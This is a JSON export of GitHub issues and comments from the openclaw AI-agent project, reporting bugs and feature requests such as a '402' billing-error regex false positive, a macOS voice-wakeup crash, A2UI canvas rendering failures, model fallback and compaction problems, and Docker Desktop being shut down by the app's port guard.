      "number": 13822,
      "title": "False positive billing error: \\b402\\b regex matches issue numbers in response body",
      "body": "## Bug Description\n\n`sanitizeUserFacingText()` in `pi-embedded-helpers` replaces the **entire agent response** with a billing error message when the response body contains text like `CHE-402`, `ISSUE-402`, `#402`, etc. — any text where `402` appears as a word boundary match.\n\nThe root cause is the `/\\b402\\b/` regex in the `billing` error patterns (in `ERROR_PATTERNS`), which is too broad. It matches any occurrence of `402` in the response text, not just actual HTTP 402 errors.\n\n## Steps to Reproduce\n\n1. Have an agent generate a response that includes text containing `402` (e.g., a Linear issue ID like `CHE-402`)\n2. The response is passed through `sanitizeUserFacingText()` → `isBillingErrorMessage()` → `matchesErrorPatterns()`\n3. `/\\b402\\b/.test(\"che-402 ...\")` returns `true` (because `\\b` matches the boundary between `-` and `4`)\n4. The entire valid response is replaced with the billing error message\n\n## Expected Behavior\n\nAgent responses containing `402` in non-HTTP-error contexts (issue IDs, product codes, addresses, etc.) should be passed through without modification.\n\n## Actual Behavior\n\nThe entire response is replaced with:\n> API provider returned a billing error — your API key has run out of credits or has an insufficient balance.\n\n## Analysis\n\n**File:** `src/agents/pi-embedded-helpers/errors.ts` (bundled into multiple `pi-embedded-helpers-*.js` files)\n\n```javascript\n// ERROR_PATTERNS.billing array:\nbilling: [\n    /\\b402\\b/,              // ← This regex is too broad\n    \"payment required\",\n    \"insufficient credits\",\n    \"credit balance\",\n    \"plans & billing\"\n],\n```\n\nThe `matchesErrorPatterns()` function runs these patterns against the full response text (lowercased), so any mention of `402` triggers the false positive.\n\n**Additional note:** This only affects non-streaming outputs (e.g., Slack integration via gateway). TUI renders text progressively before the final sanitization pass, so the issue isn't visible there.\n\n## Suggested Fix\n\nReplace the broad `/\\b402\\b/` regex with a pattern that only matches HTTP 402 error contexts:\n\n```javascript\n/(?:status|code|http|error)\\s*[:=]?\\s*402\\b|^\\s*402\\s+payment/i\n```\n\nThis would match `status: 402`, `HTTP 402`, `error code 402`, etc., while ignoring `CHE-402`, `#402`, `issue-402`, and other non-error usages.\n\n## Environment\n\n- openclaw version: latest (installed via homebrew)\n- OS: macOS",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13822",
      "createdAt": "2026-02-11T02:35:21Z",
      "updatedAt": "2026-02-11T02:35:21Z",
      "author": "tnlvof",
      "labels": [],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "tui",
          "config"
        ]
      }
    },
    {
      "number": 11142,
      "title": "Feature Request: Browser Auto-Launch, Stability, and Tab Reuse Improvements",
      "body": "## 🎯 Summary\n\nImprove browser integration with auto-launch, auto-connect, connection stability, tab recovery, tab reuse, and performance optimizations to reduce manual setup and errors.\n\n---\n\n## 📊 Problem Statement\n\n### Current Pain Points\n\n1. **Manual Setup Required**\n   - Must manually open Chrome\n   - Must manually click toolbar icon to connect extension\n   - Must reconnect after every restart\n   - Takes 1-2 minutes of manual work\n\n2. **Frequent Connection Failures**\n   - ~30% error rate in browser operations\n   - \"Error: tab not found\" is most common\n   - \"Can't reach browser control service\" after disconnects\n   - No automatic recovery\n\n3. **Poor Tab Tracking**\n   - Tab references lost when browser disconnects\n   - No way to recover lost tabs\n   - Must manually reopen and reattach\n   - Lost work context\n\n4. **Slow Performance**\n   - Browser operations take 5-10 seconds\n   - No caching of snapshots\n   - Repeated DOM fetches\n   - Sequential operations\n\n5. **No Tab Reuse**\n   - Opens new tabs for every operation\n   - Even when suitable tab already exists\n   - Clutters browser with duplicate tabs\n   - Wastes resources and confuses users\n   - Example: Opens new tab for same website instead of reusing existing tab\n\n---\n\n## ✨ Proposed Solutions\n\n### 1. Auto-Launch & Auto-Connect\n\n**Feature:** Automatically launch Chrome and connect extension on gateway startup\n\n**Benefits:**\n- Zero manual setup\n- Faster workflow\n- Better UX\n\n**Config:**\n```json5\n{\n  \"browser\": {\n    \"autoLaunch\": true,\n    \"autoConnect\": true,\n    \"keepAlive\": true\n  }\n}\n```\n\n### 2. Connection Monitoring & Auto-Reconnect\n\n**Feature:** Heartbeat monitoring and automatic reconnection\n\n**Benefits:**\n- 95% connection uptime (vs 70% now)\n- No manual intervention\n- Silent recovery\n\n### 3. Tab Tracking & Recovery\n\n**Feature:** Track tabs and recover lost references automatically\n\n**Benefits:**\n- 80% tab recovery rate\n- Seamless experience\n- Context preservation\n\n### 4. Performance Optimizations\n\n**Feature:** Cache snapshots and batch operations\n\n**Benefits:**\n- 2-3x faster operations\n- Reduced network traffic\n\n### 5. Intelligent Tab Reuse ⭐ **NEW**\n\n**Feature:** Reuse existing tabs instead of opening duplicates\n\n**Behavior:**\n- Before opening new tab, search for existing tab with same URL/domain\n- If found, navigate to that tab\n- If not found, open new tab\n\n**Benefits:**\n- 70% fewer duplicate tabs\n- Less resource usage\n- Cleaner browser experience\n- Faster navigation\n\n---\n\n## 📈 Expected Impact\n\n| Metric | Current | Target | Improvement |\n|--------|---------|--------|-------------|\n| Setup Time | 120s | 0s | **100%** |\n| Connection Uptime | 70% | 95% | **36%** |\n| Tab Recovery | 0% | 80% | **80%** |\n| Operation Speed | 5s | 2s | **60%** |\n| Error Rate | 30% | 5% | **83%** |\n| Duplicate Tabs | 100% | 30% | **70%** |\n\n---\n\n## 🏗️ Implementation\n\n**Estimated Effort:** 18-20 hours\n\n**New Files:**\n- `auto-connect.ts` - Auto-launch & connect\n- `tab-manager.ts` - Tab tracking & recovery\n- `tab-reuse.ts` - Smart tab reuse logic\n- `connection-monitor.ts` - Heartbeat & reconnect\n- `cache.ts` - Performance caching\n- Comprehensive tests for all\n\n**Modified Files:**\n- `extension-relay.ts` - Add connection events\n- `server-context.ts` - Integrate tab manager\n- `profiles-service.ts` - Add auto-launch\n\n---\n\n## ⚠️ Breaking Changes\n\n**None.** All features are:\n- Opt-in via configuration\n- Backwards compatible\n- Default: disabled (current behavior)\n\n---\n\n## 💬 Additional Context\n\n**Environment:**\n- Windows 10/11\n- Chrome browser\n- OpenClaw Browser Relay extension\n\n**Usage Pattern:**\n- Daily usage with ~50 browser commands\n- 30% error rate currently\n- Heavy reliance on browser automation\n\n**Why This Matters:**\n- Browser is critical for many workflows\n- Manual setup creates friction\n- Errors break automation\n- Poor UX hurts adoption\n\n---\n\n**Date:** February 7, 2026  \n**Priority:** High (improves core functionality)",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11142",
      "createdAt": "2026-02-07T13:02:22Z",
      "updatedAt": "2026-02-11T02:31:13Z",
      "author": "xtromate",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows",
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3881765366,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11142#issuecomment-3881765366",
          "createdAt": "2026-02-11T02:31:13Z",
          "updatedAt": "2026-02-11T02:31:13Z",
          "author": "wenstonwh-ux",
          "body": "+1. Additional case: when the Gateway runs on a separate machine and a Windows node host is connected via `openclaw node install`, the browser control service + relay (default port) don't start until a browser profile is explicitly launched through the Gateway's node proxy. The node advertises `browser` capability in its caps, but the relay isn't actually listening. `nodeHost.browserProxy.enabled: true` (the default) should auto-start the browser control service and relay at node startup, so the Chrome extension can connect immediately without requiring a manual profile launch first.\n\nEnvironment: OpenClaw 2026.2.9, Windows node host, remote Linux Gateway."
        }
      ]
    },
    {
      "number": 13803,
      "title": "🔥🔥🔥OpenClaw系列高级用法视频分享",
      "body": "✅OpenCLaw视频1：https://youtu.be/masJoPqT-6A\n✅OpenCLaw视频2：https://youtu.be/c5LKNO4YptM\n✅OpenCLaw视频3：https://youtu.be/1qkQEffNacQ\n✅OpenCLaw视频4：https://youtu.be/pvlPkUauHis\n✅OpenCLaw视频5：https://youtu.be/daXOXSSyudM",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13803",
      "createdAt": "2026-02-11T02:04:24Z",
      "updatedAt": "2026-02-11T02:21:01Z",
      "author": "win4r",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 13808,
      "title": "[Bug]: [macOS] Voice Wakeup settings toggle causes immediate crash (SIGABRT)",
      "body": "[macOS] Voice Wakeup settings toggle causes immediate crash (SIGABRT)\nEnvironment\nOpenClaw: 2026.2.9 (build 9194)\nmacOS: 26.2 (25C56)\nArchitecture: arm64 (Apple Silicon)\nBundle ID: bot.molt.mac\nBug Description\nToggling the Voice Wakeup option in the OpenClaw macOS menu bar app causes an immediate crash (SIGABRT). The app disappears from the menu bar and must be manually relaunched. This is 100% reproducible.\n\nSteps to Reproduce\nLaunch OpenClaw.app (menu bar icon appears)\nClick the menu bar icon → open Settings\nToggle Voice Wakeup on\nApp crashes instantly\nCrash Analysis\nException: EXC_CRASH (SIGABRT)\nSignal: SIGABRT\nCrashed Thread: 16\n\nRoot Cause\nVoiceWakeSettings.restartMeter() calls MicLevelMonitor.start(onLevel:), which calls AVAudioNode.installTapOnBus:bufferSize:format:block:. This AVFAudio call throws an unhandled NSException, causing the app to abort.\n\nLikely causes:\n\nAudio engine not started before installing tap\nMicrophone permission not requested/granted before accessing audio node\nInvalid audio format passed to installTapOnBus\nTap already installed on the bus (duplicate tap)\nCrash Stack Trace\nThread 16 Crashed:\n  libsystem_kernel.dylib    __pthread_kill\n  libsystem_c.dylib         abort\n  libc++abi.dylib            __abort_message\n  libc++abi.dylib            demangling_terminate_handler()\n  libobjc.A.dylib            objc_exception_throw\n  CoreFoundation             +[NSException raise:format:]\n  AVFAudio                   AVAudioEngineImpl::InstallTapOnNode(...)\n  AVFAudio                   -[AVAudioNode installTapOnBus:bufferSize:format:block:]\n  OpenClaw                   MicLevelMonitor.start(onLevel:)\n  OpenClaw                   VoiceWakeSettings.restartMeter()\n  OpenClaw                   closure #4 in VoiceWakeSettings.body.getter\nLast Exception Backtrace\nCoreFoundation    __exceptionPreprocess\n  libobjc.A.dylib   objc_exception_throw\n  CoreFoundation    -[NSException initWithCoder:]\n  AVFAudio          AVAudioEngineImpl::InstallTapOnNode(...)\n  AVFAudio          -[AVAudioNode installTapOnBus:bufferSize:format:block:]\n  OpenClaw          MicLevelMonitor.start(onLevel:)\n  OpenClaw          VoiceWakeSettings.restartMeter()\nSuggested Fix\nWrap the installTapOnBus call in MicLevelMonitor.start() with a do/catch or check preconditions:\n\nswift\n// Pseudo-fix\nfunc start(onLevel: @escaping (Float) -> Void) {\n    // 1. Check microphone permission first\n    guard AVCaptureDevice.authorizationStatus(for: .audio) == .authorized else {\n        // Request permission or show alert\n        return\n    }\n    \n    // 2. Ensure engine is running\n    guard engine.isRunning else {\n        try? engine.start()\n        return\n    }\n    \n    // 3. Remove existing tap before installing new one\n    inputNode.removeTap(onBus: 0)\n    \n    // 4. Safely install tap\n    inputNode.installTap(onBus: 0, bufferSize: bufferSize, format: format) { buffer, time in\n        // ...\n    }\n}\nAdditional Context\nCrash is 100% reproducible across fresh installs\n5 crash reports generated in a single day from this issue\nAll other app features work normally\nCrash occurs on both fresh install and reinstall\nmacOS microphone permission may not have been requested before the audio tap is installed\nCrash Report\nIncident ID: E31363F6-8D25-4473-ABB9-CFF74353CDE9\nFull .ips file available on request.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13808",
      "createdAt": "2026-02-11T02:12:20Z",
      "updatedAt": "2026-02-11T02:12:20Z",
      "author": "DyingSecret",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "signal"
        ],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 7143,
      "title": "macOS App Canvas stuck on 'Waiting for A2UI message' despite successful push",
      "body": "## Description\n\nmacOS App Canvas window shows \"Waiting for A2UI message\" and never updates, even though A2UI push commands report success.\n\n## Environment\n\n- **macOS App version:** 2026.2.1 (8650)\n- **Gateway version:** 2026.2.1\n- **macOS:** 26.2.0 (arm64)\n- **Device:** Mac mini (Mac16,10)\n\n## Steps to Reproduce\n\n1. Start Gateway with `canvasHost.enabled: true`\n2. Open macOS App, connect as node\n3. Open Canvas window (shows \"Waiting for A2UI message\")\n4. Push A2UI content:\n   ```bash\n   openclaw nodes canvas a2ui push --jsonl /tmp/a2ui-test.jsonl --node \"Mac mini\"\n   ```\n5. CLI reports success: `canvas a2ui push ok (v0.8, 2 messages)`\n\n## Expected Behavior\n\nCanvas should display the pushed A2UI content.\n\n## Actual Behavior\n\nCanvas remains stuck on \"Waiting for A2UI message\".\n\n## Verification\n\n- A2UI host is running: `curl http://127.0.0.1:18789/__openclaw__/a2ui/` returns 200\n- Node is connected: `openclaw nodes status` shows `connected: true`\n- Push succeeds: CLI confirms `canvas a2ui push ok`\n\n## A2UI Test Payload\n\n```json\n{\"surfaceUpdate\":{\"surfaceId\":\"main\",\"components\":[{\"id\":\"root\",\"component\":{\"Column\":{\"children\":{\"explicitList\":[\"title\",\"content\"]}}}},{\"id\":\"title\",\"component\":{\"Text\":{\"text\":{\"literalString\":\"Hello\"},\"usageHint\":\"h1\"}}},{\"id\":\"content\",\"component\":{\"Text\":{\"text\":{\"literalString\":\"Test\"},\"usageHint\":\"body\"}}}]}}\n{\"beginRendering\":{\"surfaceId\":\"main\",\"root\":\"root\"}}\n```\n\n## Notes\n\n- `canvas.present` with a URL works (shows the webpage)\n- `canvas.navigate` works\n- Only A2UI push doesn't display",
      "state": "open",
      "comments": 5,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/7143",
      "createdAt": "2026-02-02T12:55:11Z",
      "updatedAt": "2026-02-11T02:12:14Z",
      "author": "Sandboxcn",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3836472391,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7143#issuecomment-3836472391",
          "createdAt": "2026-02-02T16:55:15Z",
          "updatedAt": "2026-02-02T16:55:15Z",
          "author": "zhecks",
          "body": "so am I"
        },
        {
          "id": 3841121245,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7143#issuecomment-3841121245",
          "createdAt": "2026-02-03T12:48:54Z",
          "updatedAt": "2026-02-03T12:49:11Z",
          "author": "tralves",
          "body": "## Additional findings from debugging (according to my agent)\n\nI've been experiencing the same issue and did some investigation via `canvas.eval`:\n\n### The A2UI page is ready to receive messages\n\n```javascript\nwindow.openclawA2UI  // exists with: applyMessages, reset, getSurfaces\nBut the WKWebView message handlers are not registered\nwindow.webkit.messageHandlers  // returns empty array []\nWorkaround that works\nCalling applyMessages directly via canvas.eval successfully renders the A2UI:\n\n// via canvas.eval\nconst host = document.querySelector('openclaw-a2ui-host');\nhost.applyMessages([\n  {surfaceUpdate: {...}},\n  {beginRendering: {...}}\n]);\n// This works! Content renders.\n```\n\n## Conclusion\n\nThe A2UI host page is correctly set up and waiting for messages. The issue appears to be that the macOS app is not bridging the `a2ui_push` commands it receives from the Gateway to the WebView. The app should either:\n\nRegister a WKScriptMessageHandler for bidirectional communication, or\nCall `webView.evaluateJavaScript(\"openclawA2UI.applyMessages(...)\")` when it receives an `a2ui_push command`\nThe Gateway side seems fine — the push reports success, the A2UI host serves correctly, and manually injecting via eval works.\n\nEnvironment: macOS App 2026.2.1 (8650), Gateway 2026.2.1, macOS 26.2.0"
        },
        {
          "id": 3843121108,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7143#issuecomment-3843121108",
          "createdAt": "2026-02-03T19:05:22Z",
          "updatedAt": "2026-02-03T19:20:20Z",
          "author": "rothnic",
          "body": "## Our Experience\n\n### Setup\n- Gateway running on a cloud VM (not localhost)\n- macOS app connecting to gateway via VPN (Tailscale)\n- Gateway behind a reverse proxy\n\n### Initial Symptoms\n- `a2ui push` returned `ok` but canvas showed \"Waiting for A2UI messages\"\n- Confirmed `openclawA2UI` object exists via `canvas eval --js \"typeof openclawA2UI\"` → `\"object\"`\n- `canvas eval` workaround to call `applyMessages()` directly **worked** (consistent with @tralves findings)\n\n### What We Changed (in order)\n\n| Change | Observed Effect |\n|--------|----------------|\n| Set `canvasHost.liveReload: false` | Stopped a reload loop we observed (page was reloading repeatedly) |\n| Added VPN IP range to `gateway.trustedProxies` | Resolved WebSocket handshake timeout errors we saw in logs |\n| Patched `CanvasManager.swift` (see below) | Content stopped disappearing after briefly flashing |\n\n### Gateway Config That Works For Us\n\n```json\n{\n  \"canvasHost\": {\n    \"advertisedUrl\": \"https://<your-gateway-domain>\",\n    \"liveReload\": false\n  },\n  \"gateway\": {\n    \"trustedProxies\": [\"10.0.0.0/8\", \"172.16.0.0/12\", \"100.64.0.0/10\"]\n  }\n}\n```\n\nNote: The `100.64.0.0/10` range is for Tailscale CGNAT IPs. Adjust for your network.\n\n### macOS App Patch\n\nWe observed content would flash briefly then disappear. We traced this to `maybeAutoNavigateToA2UI()` in `CanvasManager.swift` calling `controller.load()` even when the WebView was already at the target URL.\n\nOur patch adds a guard:\n\n```swift\nif self.lastAutoA2UIUrl == a2uiUrl,\n   let current = controller.currentTarget?.trimmingCharacters(in: .whitespacesAndNewlines),\n   current == a2uiUrl\n{\n    return  // Skip reload if already at target\n}\n```\n\nBranch with patch: `rothnic/openclaw:fix/a2ui-canvas-flash-disappear`\n\n### Notes\n- We cannot confirm which changes were strictly necessary vs. coincidental\n- Our setup may have unique factors (VPN, reverse proxy) that others may not have\n- The `canvas eval` workaround confirms the A2UI rendering pipeline itself works"
        },
        {
          "id": 3843521178,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7143#issuecomment-3843521178",
          "createdAt": "2026-02-03T20:35:51Z",
          "updatedAt": "2026-02-03T20:35:51Z",
          "author": "rothnic",
          "body": "## PR Submitted: #8261\n\nAfter further investigation, here's what we confirmed is needed for A2UI Canvas to work on remote gateways:\n\n### Confirmed Required Fixes (in PR)\n\n| Fix | Component | Description |\n|-----|-----------|-------------|\n| `canvasHost.advertisedUrl` | Gateway | New config option so gateway returns a reachable URL to remote nodes instead of `127.0.0.1` |\n| `maybeAutoNavigateToA2UI` guard | macOS App | Prevents page reload when already at target URL (fixes content flash-then-disappear) |\n\n### Also Needed (existing config)\n\n| Config | Purpose |\n|--------|---------|\n| `gateway.trustedProxies` | Must include VPN IP ranges (e.g., `100.64.0.0/10` for Tailscale) for WebSocket connections |\n\n### Not Required\n\n| Config | Notes |\n|--------|-------|\n| `canvasHost.liveReload: false` | Initially thought to be needed, but the reload issue was the CanvasManager.swift bug, not liveReload |\n\n### Testing Environment\n- Gateway on Oracle Cloud VM\n- macOS app connecting via Tailscale VPN\n- Traefik reverse proxy with HTTPS\n\nPR includes documentation updates for the new config option."
        },
        {
          "id": 3881723485,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7143#issuecomment-3881723485",
          "createdAt": "2026-02-11T02:12:14Z",
          "updatedAt": "2026-02-11T02:12:14Z",
          "author": "petergaultney",
          "body": "Independent confirmation of the reload loop bug and fix: https://github.com/openclaw/openclaw/pull/8261#issuecomment-3881721334"
        }
      ]
    },
    {
      "number": 13806,
      "title": "Anthropic API key auth sends provider prefix in model ID, causing 404",
      "body": "## Summary\n\nWhen using API key auth (not setup-token), switching models via `/model claude-opus-4-5` causes OpenClaw to send `anthropic/claude-opus-4-5` to the Anthropic API. This returns 404 because Anthropic expects just `claude-opus-4-5`. \n\nNote- I am on a pro subscription for anthropic\n\n## Reproduce\n\n1. Configure Anthropic with API key (not setup-token)\n\n2. `/model claude-opus-4-5` in Telegram\n\n3. Send any message\n\n4. Get: `HTTP 404: not_found_error: model: anthropic/claude-opus-4-5`\n\n## Workaround\n\nUse `claude setup-token` + paste into OpenClaw instead of API key.\n\n## Expected\n\nStrip provider prefix before sending to Anthropic API.\n\n## Version\n\nOpenClaw 2026.2.9\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13806",
      "createdAt": "2026-02-11T02:07:24Z",
      "updatedAt": "2026-02-11T02:07:43Z",
      "author": "pparth230",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13807,
      "title": "[Bug]: Fallback models not attempted when primary provider enters rate_limit cooldown",
      "body": "## Description\n\nWhen the primary model's provider enters a rate_limit cooldown, fallback models from **different providers** are not attempted. The agent fails immediately with \"All models failed (1)\" — only the primary model is listed, meaning fallbacks were never tried.\n\n## Config\n\n```json\n{\n  \"agents\": {\n    \"defaults\": {\n      \"model\": {\n        \"primary\": \"anthropic/claude-opus-4-6\",\n        \"fallbacks\": [\n          \"google/gemini-3-pro\",\n          \"anthropic/claude-opus-4-5\",\n          \"google/gemini-3-flash-preview\"\n        ]\n      }\n    }\n  }\n}\n```\n\n## Expected Behavior\n\nWhen `anthropic/claude-opus-4-6` fails due to rate_limit cooldown:\n1. Skip `anthropic/claude-opus-4-5` (same provider, also in cooldown) ✅ makes sense\n2. **Try `google/gemini-3-pro`** (different provider, should be available) ❌ not happening\n3. Try `google/gemini-3-flash-preview` if needed\n\n## Actual Behavior\n\n```\nAll models failed (1): anthropic/claude-opus-4-6: Provider anthropic is in cooldown (all profiles unavailable) (rate_limit)\n```\n\nOnly 1 model attempted. Fallbacks from other providers (`google/*`) are never tried.\n\n## Possible Cause\n\nThe fallback loop may be short-circuiting when the primary fails with a provider-level cooldown, instead of continuing to try models from other providers.\n\n## Environment\n\n- OpenClaw version: 2026.2.6-3\n- Primary: anthropic/claude-opus-4-6\n- Fallbacks: google/gemini-3-pro, anthropic/claude-opus-4-5, google/gemini-3-flash-preview\n\n## Logs\n\n```\n2026-02-11T02:01:57.584Z Embedded agent failed before reply: All models failed (1): anthropic/claude-opus-4-6: Provider anthropic is in cooldown (all profiles unavailable) (rate_limit)\n```",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13807",
      "createdAt": "2026-02-11T02:07:35Z",
      "updatedAt": "2026-02-11T02:07:35Z",
      "author": "kitadesign",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13752,
      "title": "Support Anthropic server-side compaction (compact-2026-01-12 / context_management API)",
      "body": "## Feature Request\n\n**Summary:** Add support for Anthropic's server-side compaction via the `compact-2026-01-12` beta header and `context_management` API parameter, as an alternative to OpenClaw's built-in compaction.\n\n## Motivation\n\nOpenClaw's current built-in compaction occasionally produces invalid message sequences — specifically orphaned `tool_use_id` references where a `tool_result` block references a `tool_use` block that was summarized away. This causes Anthropic's API to reject the request with a validation error, crashing the session.\n\nThis is a recurring issue in long-running sessions with heavy tool use (e.g., file reads, shell commands, browser automation). The crash requires manual session reset to recover.\n\n## Proposed Solution\n\nAnthropic now offers server-side compaction that:\n- Handles `tool_use`/`tool_result` pair integrity correctly (never orphans one side)\n- Maintains valid message sequencing (user/assistant alternation)\n- Summarizes older context while preserving recent messages\n- Is available via beta header `compact-2026-01-12` or the `context_management` API parameter\n\n### Implementation Options\n\n1. **New compaction mode:** `agents.defaults.compaction.mode: \"anthropic\"` — delegates compaction entirely to the Anthropic API\n2. **Hybrid approach:** Use Anthropic's compaction as the primary strategy, with OpenClaw's built-in as fallback for non-Anthropic providers\n3. **Per-model config:** Allow compaction strategy to be set per model in `agents.defaults.models`\n\n## Current Workarounds\n\n- Pre-compaction memory flush (`memoryFlush`) to save state before compaction fires\n- Manual `/compact` with careful timing\n- Session resets when compaction produces invalid sequences\n\n## References\n\n- [Anthropic Compaction Docs](https://docs.anthropic.com/en/docs/build-with-claude/extended-thinking#context-window-management)\n- Beta header: `anthropic-beta: compact-2026-01-12`\n- Related: #12047 (Telegram document extraction — different issue but same session stability concern)",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13752",
      "createdAt": "2026-02-11T00:20:20Z",
      "updatedAt": "2026-02-11T02:04:01Z",
      "author": "barry-p5cc",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881704075,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13752#issuecomment-3881704075",
          "createdAt": "2026-02-11T02:04:01Z",
          "updatedAt": "2026-02-11T02:04:01Z",
          "author": "echoVic",
          "body": "## Implementation Analysis\n\nI reviewed the compaction-related source code and have some thoughts on implementation:\n\n### Current Compaction Architecture\n\nThe existing compaction lives in `src/agents/pi-embedded-runner/compact.ts` and is triggered:\n1. Automatically on context overflow (`run.ts` — up to 3 attempts)\n2. Manually via `/compact` command\n3. Via tool result truncation as a fallback\n\nThe compaction flow calls `compactEmbeddedPiSessionDirect()` which summarizes older messages while preserving recent ones.\n\n### Proposed Implementation for Anthropic Server-Side Compaction\n\n#### Option 1: Beta Header Approach (Simplest)\n\nAdd `anthropic-beta: compact-2026-01-12` header when the model is Anthropic and compaction mode is set to `\"anthropic\"`. This delegates compaction entirely to the API.\n\n**Pros:** Minimal code change, Anthropic handles tool_use/tool_result integrity\n**Cons:** Only works with Anthropic, no control over compaction behavior\n\n#### Option 2: Context Management API Parameter\n\nUse the `context_management` parameter in the API request. This gives more control:\n\n```typescript\n// In the stream/request builder for Anthropic\nif (compactionMode === 'anthropic') {\n  requestParams.context_management = {\n    enabled: true,\n    // preserve recent N messages\n    preserve_recent: config.compaction?.preserveRecent ?? 10,\n  };\n}\n```\n\n### Key Files to Modify\n\n1. `src/agents/pi-embedded-runner/run.ts` — Add Anthropic compaction mode check before built-in compaction\n2. `src/agents/pi-embedded-runner/compact.ts` — Add `compactViaAnthropic()` function\n3. `src/config/types.cron.ts` or agent config types — Add `compaction.mode: 'builtin' | 'anthropic'` config\n4. `src/agents/pi-embedded-runner/run/attempt.ts` — Pass beta header when Anthropic compaction is enabled\n\n### Config Schema\n\n```yaml\nagents:\n  defaults:\n    compaction:\n      mode: anthropic  # or 'builtin' (default)\n      # Anthropic-specific options\n      preserveRecent: 10\n```\n\n### Concerns\n\n1. **Provider lock-in** — Need fallback to built-in compaction for non-Anthropic providers\n2. **Observability** — Anthropic's compaction is opaque; we lose visibility into what was summarized\n3. **Token counting** — Need to understand how Anthropic counts tokens after compaction for billing/usage tracking\n\nI'd be happy to implement this if the maintainers agree on the approach. The beta header approach is the quickest path to a working solution."
        }
      ]
    },
    {
      "number": 6755,
      "title": "[Bug]: macOS app shutdown Docker Desktop even gateway runs in container or remove",
      "body": "## Summary\n\nWhen launching OpenClaw macOS app, Docker Desktop shutdown without noticing.\n\n## Steps to reproduce\n\n1. Setup gateway within Docker container with Docker Desktop on local Mac machine\n2. Start OpenClaw macOS app \n\n## Expected behavior\n\nDocker Desktop should be running.\n\n## Actual behavior\n\nDocker Desktop shutdown just after launch macOS app.\n\n## Environment\n\n- Clawdbot version: 2026.01.30\n- OS: macOS 26.2\n- Install method (pnpm/npx/docker/etc): npm (in docker container)\n\n## Logs or screenshots\n\n### macOS app `portguard` feature detected Docker\n\n```\n2026-02-02 10:42:31.672 I  OpenClaw[44147:42f761d] [ai.openclaw:portguard] port sweep starting (mode=remote)\n2026-02-02 10:42:31.742 E  OpenClaw[44147:42f7603] [ai.openclaw:portguard] port 18789 was held by com.docker.backend\n2026-02-02 10:42:31.743 I  OpenClaw[44147:42f7603] [ai.openclaw:portguard] port sweep done\n```\n\n```\n2026-02-02 10:43:26.224 I  OpenClaw[44444:42f8b7c] [ai.openclaw:portguard] port sweep starting (mode=remote)\n2026-02-02 10:43:26.418 E  OpenClaw[44444:42f8b9d] [ai.openclaw:portguard] port 18789 was held by com.docker.backend\n2026-02-02 10:43:26.418 I  OpenClaw[44444:42f8b9d] [ai.openclaw:portguard] port sweep done\n```\n\n### Docker Desktop shutdown logs\n\n```\n[2026-02-02T00:47:20.218694000Z][com.docker.backend.state] sending desktop state:ExitHealthyState\n[2026-02-02T00:47:20.232079000Z][com.docker.backend.electron] shutting down electron processes\n[2026-02-02T00:47:20.232014000Z][com.docker.backend.engines] engine linux/libkrun shutdown requested\n```\n\nNo explicit `POST /app/quit` API call was found in Docker logs at this time.\n\n### Conclusion\n\nThe macOS app's `portguard` feature detects when port 18789 is held by `com.docker.backend`. When switching to \"This Mac\" mode (or possibly on app launch), the portguard appears to terminate Docker Desktop to free up the port, even when the app is configured to use remote gateway mode.\n\n**Expected behavior:** When `gateway.mode` is set to `remote`, the portguard should not attempt to take over port 18789 or terminate processes holding that port.\n",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/6755",
      "createdAt": "2026-02-02T01:25:06Z",
      "updatedAt": "2026-02-11T02:02:58Z",
      "author": "teslamint",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux",
          "docker"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3832506498,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6755#issuecomment-3832506498",
          "createdAt": "2026-02-02T01:50:30Z",
          "updatedAt": "2026-02-10T05:54:22Z",
          "author": "teslamint",
